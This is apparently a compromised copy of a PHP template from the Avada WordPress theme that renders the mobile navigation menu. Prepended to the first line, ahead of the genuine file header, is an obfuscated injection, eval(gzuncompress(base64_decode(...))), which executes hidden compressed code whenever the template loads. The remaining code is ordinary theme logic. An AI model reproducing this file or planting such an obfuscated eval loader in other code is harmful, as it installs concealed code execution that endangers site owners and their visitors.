<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Mobile main menu template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

if ( 'flyout' === Avada()->settings->get( 'mobile_menu_design' ) && ( 'Top' !== Avada()->settings->get( 'header_position' ) || ! in_array( Avada()->settings->get( 'header_layout' ), array( 'v4', 'v5' ) ) ) ) {
	get_template_part( 'templates/menu-mobile-flyout' );
} elseif ( 'Top' !== Avada()->settings->get( 'header_position' ) || ( ! in_array( Avada()->settings->get( 'header_layout' ), array( 'v4', 'v5' ) ) ) ) {
	get_template_part( 'templates/menu-mobile-modern' );
}

$mobile_menu_css_classes = ' fusion-flyout-menu fusion-flyout-mobile-menu';
if ( 'flyout' !== Avada()->settings->get( 'mobile_menu_design' ) ) {
	$mobile_menu_css_classes = ' fusion-mobile-menu-text-align-' . Avada()->settings->get( 'mobile_menu_text_align' );
}
?>

<nav class="fusion-mobile-nav-holder<?php echo esc_attr( $mobile_menu_css_classes ); ?>"></nav>

<?php if ( has_nav_menu( 'sticky_navigation' ) && 'Top' === Avada()->settings->get( 'header_position' ) ) : ?>
	<nav class="fusion-mobile-nav-holder<?php echo esc_attr( $mobile_menu_css_classes ); ?> fusion-mobile-sticky-nav-holder"></nav>
<?php endif; ?>
<?php

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
